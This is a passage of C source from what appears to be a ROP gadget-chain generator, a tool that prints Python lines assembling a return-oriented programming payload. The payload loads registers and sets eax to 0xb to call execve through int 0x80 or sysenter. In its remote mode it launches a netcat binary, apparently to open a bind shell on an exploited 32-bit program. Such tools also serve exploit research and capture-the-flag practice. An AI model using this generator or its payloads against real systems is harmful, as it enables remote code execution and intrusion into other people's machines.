  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 8%s\n", BLUE, Addr_sData + 8, ENDC);
  display_padding(how_many_pop_after(pop_ecx_gadget, "pop %ecx"));

  /* set %edx */
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_edx, pop_edx_gadget, ENDC);
  display_padding(how_many_pop_before(pop_edx_gadget, "pop %edx"));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 8%s\n", BLUE, Addr_sData + 8, ENDC);
  display_padding(how_many_pop_after(pop_edx_gadget, "pop %edx"));
}

/* partie 2 init reg => %ebx = "/usb/bin/netcat\0" | %ecx = arg | %edx = "\0" */
static void makepartie2_remote(t_makecode *list_ins)
{
  Elf32_Addr addr_pop_ebx;
  Elf32_Addr addr_pop_ecx;
  Elf32_Addr addr_pop_edx;
  char *pop_ebx_gadget;
  char *pop_ecx_gadget;
  char *pop_edx_gadget;

  addr_pop_ebx = ret_addr_makecodefunc(list_ins, "pop %ebx");
  addr_pop_ecx = ret_addr_makecodefunc(list_ins, "pop %ecx");
  addr_pop_edx = ret_addr_makecodefunc(list_ins, "pop %edx");
  pop_ebx_gadget = get_gadget_since_addr(addr_pop_ebx);
  pop_ecx_gadget = get_gadget_since_addr(addr_pop_ecx);
  pop_edx_gadget = get_gadget_since_addr(addr_pop_edx);

  /* set %ebx */
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_ebx, pop_ebx_gadget, ENDC);
  display_padding(how_many_pop_before(pop_ebx_gadget, "pop %ebx"));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data%s\n", BLUE, Addr_sData, ENDC);
  display_padding(how_many_pop_after(pop_ebx_gadget, "pop %ebx"));

  /* set %ecx */
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_ecx, pop_ecx_gadget, ENDC);
  display_padding(how_many_pop_before(pop_ecx_gadget, "pop %ecx"));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 40%s\n", BLUE, Addr_sData + 40, ENDC);
  display_padding(how_many_pop_after(pop_ecx_gadget, "pop %ecx"));

  /* set %edx */
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_edx, pop_edx_gadget, ENDC);
  display_padding(how_many_pop_before(pop_edx_gadget, "pop %edx"));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 52%s\n", BLUE, Addr_sData + 52, ENDC);
  display_padding(how_many_pop_after(pop_edx_gadget, "pop %edx"));
}

/* partie 3 init eax = 0xb (execve) */
static void makepartie3(t_makecode *list_ins)
{
  Elf32_Addr addr_xor_eax;
  Elf32_Addr addr_inc_eax;
  char *xor_eax_gadget;
  char *inc_eax_gadget;
  int i = 0;

  addr_xor_eax = ret_addr_makecodefunc(list_ins, "xor %eax,%eax");
  addr_inc_eax = ret_addr_makecodefunc(list_ins, "inc %eax");
  xor_eax_gadget = get_gadget_since_addr(addr_xor_eax);
  inc_eax_gadget = get_gadget_since_addr(addr_inc_eax);

  /* set %eax => 0 */
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_xor_eax, xor_eax_gadget, ENDC);
  display_padding(how_many_pop(xor_eax_gadget));

  /* set %eax => 0xb for sys_execve() */
  while (i != 0xb)
    {
      fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_inc_eax, inc_eax_gadget, ENDC);
      display_padding(how_many_pop(inc_eax_gadget));
      i++;
    }
}

/* partie 4 call "int 0x80" or "sysenter" */
static void makepartie4(t_makecode *list_ins)
{
  Elf32_Addr addr_int_0x80;
  Elf32_Addr addr_sysenter;
  Elf32_Addr addr_pop_ebp;
  char *pop_ebp_gadget;

  addr_int_0x80 = ret_addr_makecodefunc(list_ins, "int $0x80");
  addr_sysenter = ret_addr_makecodefunc(list_ins, "sysenter");
  addr_pop_ebp  = ret_addr_makecodefunc(list_ins, "pop %ebp");
  pop_ebp_gadget = get_gadget_since_addr(addr_pop_ebp);

  if (addr_int_0x80)
    fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # int $0x80%s\n", BLUE, addr_int_0x80, ENDC);
  else if (addr_sysenter)
    {
      fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_ebp, pop_ebp_gadget, ENDC);
      fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data %s\n", BLUE, Addr_sData, ENDC);
      fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # sysenter%s\n", BLUE, addr_sysenter, ENDC);
    }
}

void makecode(t_makecode *list_ins)
{
  if (!bind_mode.flag)
    {
      makepartie1_local(list_ins);
      makepartie2_local(list_ins);
    }
  else
    {
      makepartie1_remote(list_ins);
      makepartie2_remote(list_ins);
    }
  makepartie3(list_ins);
  makepartie4(list_ins);
  fprintf(stdout, "\t%sEOF Payload%s\n", YELLOW, ENDC);
  free_add_element(list_ins);
}
